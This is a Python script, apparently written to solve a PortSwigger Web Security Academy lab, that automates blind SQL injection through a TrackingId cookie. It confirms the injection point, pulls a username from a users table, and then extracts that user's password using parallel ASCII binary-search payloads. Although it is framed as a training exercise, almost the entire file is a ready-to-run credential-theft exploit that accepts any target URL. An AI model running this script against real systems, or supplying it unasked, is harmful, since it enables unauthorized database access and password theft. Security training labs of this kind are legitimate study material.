import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def main():
    print("\n" + "="*60)
    print("  🔥 ULTRA-FAST BLIND SQL INJECTION (ASCII Binary Search)")
    print("="*60 + "\n")

    # -------- USER INPUTS --------
    lab_url = input("➡️  Lab URL (domain only, no trailing slash): ").strip()
    tracking_id = input("➡️  TrackingId cookie value: ").strip()
    
    success_msg = input("➡️  Text that appears when condition is TRUE (e.g., 'Welcome back'): ").strip()
    if not success_msg:
        success_msg = "Welcome back"  # default
        print(f"   (Using default: '{success_msg}')")
    
    known_username = input("➡️  Do you know the target username? (y/N): ").strip().lower()
    target_username = ""
    if known_username == 'y':
        target_username = input("➡️  Enter username: ").strip()
    
    use_proxy = input("➡️  Use Burp proxy? (y/N): ").strip().lower()
    
    proxies = {}
    if use_proxy == 'y':
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        print("[*] Proxy enabled. Intercept must be OFF in Burp.\n")

    session = requests.Session()
    session.proxies = proxies

    # -------- CORE FUNCTIONS --------
    def inject(payload):
        """Send the injection payload and return True if success_msg found."""
        cookies = {"TrackingId": tracking_id + payload}
        try:
            resp = session.get(lab_url, cookies=cookies, timeout=4)
            return success_msg in resp.text
        except:
            return False

    def get_length(sql_query):
        """Binary search to find LENGTH(sql_query). Max 50 chars."""
        low, high = 1, 50
        while low < high:
            mid = (low + high) // 2
            payload = f"' AND (SELECT LENGTH(({sql_query})) > {mid}) -- "
            if inject(payload):
                low = mid + 1
            else:
                high = mid
        return low

    def get_char_at_pos(sql_query, pos):
        """ASCII Binary search to find character at given position."""
        low, high = 32, 126  # printable ASCII range
        while low < high:
            mid = (low + high) // 2
            # Check if ASCII value > mid
            payload = f"' AND (SELECT ASCII(SUBSTRING(({sql_query}), {pos}, 1)) > {mid}) -- "
            if inject(payload):
                low = mid + 1
            else:
                high = mid
        return chr(low)  # Convert ASCII code to character

    def extract_string(sql_query, length):
        """Extract all characters in parallel using threads."""
        result_chars = [''] * length
        def worker(pos):
            ch = get_char_at_pos(sql_query, pos)
            return pos, ch

        print("[*] Extracting characters (parallel)...")
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(worker, pos): pos for pos in range(1, length+1)}
            for future in as_completed(futures):
                pos, ch = future.result()
                result_chars[pos-1] = ch
                # Show live progress
                sys.stdout.write(f"\r🔑 Progress: {''.join(result_chars)}")
                sys.stdout.flush()
        return ''.join(result_chars)

    # -------- STEP 1: Verify Vulnerability --------
    print("\n[*] Checking connection & vulnerability...")
    if not inject("' AND '1'='1"):
        print("\n[!] ERROR: Basic test failed! Possible reasons:")
        print("    - Wrong Lab URL (use only domain, no /filter...)")
        print("    - Wrong TrackingId (copy exactly from browser/Burp)")
        print("    - Lab session expired (Restart lab on PortSwigger)")
        print("    - Success message text is incorrect")
        return
    print("[+] ✅ Connection successful! Vulnerability confirmed.\n")

    # -------- STEP 2: Get Username (if not provided) --------
    if not target_username:
        print("[*] Username not provided. Finding the first user from 'users' table...")
        username_query = "SELECT username FROM users LIMIT 1"
        username_len = get_length(username_query)
        target_username = extract_string(username_query, username_len)
        print(f"\n[+] ✅ Found username: {target_username}")
    else:
        print(f"[+] Using provided username: {target_username}")

    # -------- STEP 3: Get Password Length --------
    password_query = f"SELECT password FROM users WHERE username='{target_username}'"
    print(f"\n[*] Finding password length for '{target_username}'...")
    pass_len = get_length(password_query)
    print(f"[+] Password length: {pass_len}")

    # -------- STEP 4: Extract Password (Super Fast) --------
    password = extract_string(password_query, pass_len)
    print(f"\n\n" + "="*60)
    print(f"✅ FINAL PASSWORD: {password}")
    print("="*60)
    print("\n👉 Go to the lab login page and use:")
    print(f"   Username: {target_username}")
    print(f"   Password: {password}")
    print("\n🏆 Lab Solved!")

if __name__ == "__main__":
    main()
